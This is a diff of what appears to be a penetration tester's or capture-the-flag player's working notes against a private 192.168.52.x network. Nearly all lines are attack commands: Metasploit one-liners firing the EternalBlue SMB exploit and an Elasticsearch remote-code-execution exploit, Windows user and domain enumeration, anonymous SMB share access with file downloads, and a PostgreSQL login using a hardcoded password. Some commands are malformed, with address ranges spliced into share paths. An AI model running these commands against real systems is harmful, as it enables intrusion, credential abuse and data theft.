@@ -1,32 +1,16 @@
 maybe try
+
+try the following:
+export PGPASSWORD=Pikachu
+psql -h 192.168.52.60 -U postgres -w
+
 msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set rhosts 192.168.52.1-100/combined/192.168.52.70/; exploit;"
 shell
 net user
 net user /domain
 dir
-msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set rhosts 192.168.52.60; exploit;"
-msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set rhosts 192.168.52.60; exploit;"
-smbclient \\\\192.168.52.4\\192.168.52.1-100/combined/192.168.52.4/shares/all.dbs_MysteryEgg -U anonymous -N
-dir
-get filex
-\n smbclient \\\\192.168.52.4\\192.168.52.1-100/combined/192.168.52.4/shares/all.dbs_MysteryEgg -U anonymous -N
-dir
-get filex
-smbclient \\\\192.168.52.4\\ -U anonymous -N
-dir
-get filex
-smbclient \\\\192.168.52.4\\192.168.52.1-100/combined/192.168.52.4/shares/all.dbs_MysteryEgg -U anonymous -N
-dir
-get filex
-smbclient \\\\192.168.52.4\\192.168.52.1-100/combined/192.168.52.4/shares/all.dbs_MysteryEgg -U anonymous -N
-dir
-get filex
-smbclient \\\\192.168.52.4\\ -U anonymous -N
-dir
-get filex
-smbclient \\\\192.168.52.4\\ -U anonymous -N
-dir
-get filex
 smbclient \\\\192.168.52.4\\MysteryEgg -U anonymous -N
-dir
-get filex
+            dir
+            get filex
+on 192.168.52.1-100/combined/192.168.52.70/ there is probably a smb but no connection
+msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set rhosts 192.168.52.60; exploit;"
